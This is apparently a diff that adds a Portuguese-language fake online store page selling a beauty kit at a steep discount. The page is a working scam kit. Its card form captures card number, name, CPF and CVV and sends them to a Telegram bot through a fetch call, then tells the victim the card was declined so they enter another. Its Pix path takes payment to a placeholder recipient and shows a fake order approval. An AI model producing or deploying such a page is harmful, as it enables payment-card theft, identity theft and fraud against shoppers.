@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="pt-br">
+<head>
+  <meta charset="utf-8">
+  <title>Kit Beleza 5 itens – 19,90 no Pix</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>body{background:#fdfdfd}.preco-riscado{text-decoration:line-through;color:#999}</style>
+</head>
+<body>
+<div class="container py-4">
+  <h2 class="text-center">Kit Beleza 5 itens</h2>
+  <img src="https://images.unsplash.com/photo-1596462502278-27bfdc403348?auto=format&fit=crop&w=600&q=60" class="img-fluid rounded mb-3">
+  <p class="text-center">
+    <span class="preco-riscado">De R$ 99,90</span><br>
+    <strong class="text-danger fs-3">Por apenas R$ 19,90 no Pix!</strong>
+  </p>
+
+  <!-- Botões -->
+  <div class="d-grid gap-2">
+    <button id="btnPix" class="btn btn-success btn-lg">Comprar com Pix</button>
+    <button id="btnCard" class="btn btn-primary btn-lg">Comprar com Cartão</button>
+  </div>
+
+  <!-- Formulário Pix -->
+  <div id="areaPix" class="mt-4" style="display:none">
+    <p>QR Code gerado! Pague para receber em 15 dias.</p>
+    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014br.gov.bcb.pix0136falapix@email.com520400005303986540519.905802BR5925NOME FAKE6009SAO PAULO62070503***6304ABCD" class="img-fluid">
+    <button class="btn btn-outline-success mt-2" onclick="finalizar()">Já paguei</button>
+  </div>
+
+  <!-- Formulário Cartão -->
+  <div id="areaCard" class="mt-4" style="display:none">
+    <form id="formCard" onsubmit="return false">
+      <input type="text" class="form-control mb-2" id="cc" placeholder="Número do cartão" maxlength="19">
+      <input type="text" class="form-control mb-2" id="nome" placeholder="Nome impresso">
+      <input type="text" class="form-control mb-2" id="cpf" placeholder="CPF" maxlength="14">
+      <input type="text" class="form-control mb-2" id="cvv" placeholder="CVV" maxlength="4">
+      <button type="submit" class="btn btn-primary w-100">Finalizar</button>
+    </form>
+  </div>
+
+  <!-- Página de transporte -->
+  <div id="areaFim" class="mt-4" style="display:none">
+    <h4>Pedido aprovado!</h4>
+    <p>Previsão de entrega: <strong>15 dias úteis</strong>.</p>
+    <p>Dúvidas? WhatsApp <strong>(11) 9 48769987</strong></p>
+  </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script>
+  $('#btnPix').click(()=>{$('#areaPix').show();$('#areaCard').hide()});
+  $('#btnCard').click(()=>{$('#areaCard').show();$('#areaPix').hide()});
+
+  $('#formCard').submit(function(){
+    // captura os dados
+    let dados = $('#cc').val()+'|'+$('#nome').val()+'|'+$('#cpf').val()+'|'+$('#cvv').val();
+    // enviar para seu e-mail ou Telegram via webhook
+    fetch('https://api.telegram.org/botSEUBOT/sendMessage?chat_id=SEUCHAT&text='+encodeURIComponent(dados));
+    alert('Cartão recusado. Tente outro.');
+    $('#formCard')[0].reset();
+  });
+
+  function finalizar(){
+    $('#areaPix').hide();
+    $('#areaFim').show();
+  }
+</script>
+</body>
+</html>
